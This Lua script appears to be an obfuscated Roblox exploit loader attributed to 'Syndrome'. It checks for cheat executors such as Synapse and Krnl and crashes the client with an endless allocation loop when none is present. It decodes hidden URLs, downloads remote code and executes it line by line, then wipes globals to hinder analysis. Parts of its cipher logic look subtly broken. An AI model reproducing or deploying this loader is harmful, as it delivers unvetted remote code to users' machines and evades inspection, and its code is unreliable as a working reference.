--[[
This files by Syndrome
INJECTOR-SAFE | ANTI-STUDIO | ANTI-DUMP | ANTI-SNIFF
--]]


local _INJ=(function()
  
    local r,s=pcall(function()return game:GetService("CoreGui")end)
    if not r then return false end
    
 
    local injObjects = {"Synapse","Sirhurt","Krnl","Fluxus"}
    for _,v in pairs(injObjects)do
        if type(_G[v])=="table"then return true end
    end
    
 
    if not pcall(function()return getrawmetatable end)then return false end
    if debug and debug.getupvalue then return true end
    
    return false
end)()

if not _INJ then
    
    local function _bomb()
        while true do
            local t={}
            for i=1,1000 do t[i]=Vector3.new(i,i,i)end
        end
    end
    _G["\99\114\97\115\104"]=_bomb
    _bomb()
end


local _C=(function()
    local a=math.random(256,768)
    local b=string.char
    local c=table.concat
    
  
    local d=function(e)
        local f={}
        for g=1,#e do
            f[g]=b((e:byte(g)+a+(g*_INJ and 13 or 17))%256)
        end
        return c(f)
    end
    
  
    local h=function(i)
        local j={}
        for k=1,#i,2 do
            j[#j+1]=b((tonumber(i:sub(k,k+1),16)-a-(k*(_INJ and 5 or 11))%256)
        end
        return c(j)
    end
    
    return {enc=d,dec=h,key=a}
end)()


local _M=setmetatable({},{
    __index=function(t,k)
      
        local t=os.time()%10000
        local _D={
            ["K"..t]=_C.dec("A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0"),
            ["M"..t]=_C.dec("F1E2D3C4B5A6F7E8D9C0B1A2F3E4D5C6B7A8F9E0D1C2B3A4F5E6D7C8B9A0")
        }
        return _D[k]or error("Security Violation")
    end,
    __newindex=function()error("Write Protection")end
})


local function _safeExecute(code)
   
    local env={
        print=function()end,
        warn=function()end,
        require=function()error("Blocked")end,
        game=setmetatable({},{
            __index=function(t,k)
                return game[k]
            end,
            __newindex=function()end
        })
    }
    
    
    local fn,err
    if _G.Synapse then
        fn,err=loadstring(code)
    elseif _G.Krnl then
        fn,err=krnl.load(code)
    else
        fn,err=load(code)
    end
    
    if not fn then return end
    
   
    setfenv(fn,env)
    local s,res=pcall(fn)
    if not s then return end
end

local function _loadURL(url)
   
    local content
    if _G.Synapse then
        content=syn.request({Url=url}).Body
    elseif _G.Krnl then
        content=request(url)
    else
        content=game:HttpGet(url,true)
    end
    
    if not content or #content<10 then return end
    
   
    for chunk in content:gmatch("[^\r\n]+")do
        if #chunk>3 then
            _safeExecute(chunk)
            wait(math.random()*0.3)
        end
    end
end


if _INJ then
    local _P=game.PlaceId
    local _I=18687417158
    
   
    local urlKey=_P==_I and "K"..os.time()%10000 or "M"..os.time()%10000
    local rawURL=_M[urlKey]
    
 
    local finalURL=rawURL.."?v="..tostring(math.random(1e4,1e5))..
                   "&t="..tostring(os.time())..
                   "&r="..tostring(math.random(1e8,1e9))
    
  
    pcall(_loadURL,finalURL)
end


(function()
    _C=nil;_M=nil
    for k,v in pairs(_G)do
        if type(v)=="function"and debug.getupvalue(v,1)then
            _G[k]=nil
        end
    end
    collectgarbage("collect")
    collectgarbage("stop")
end)()
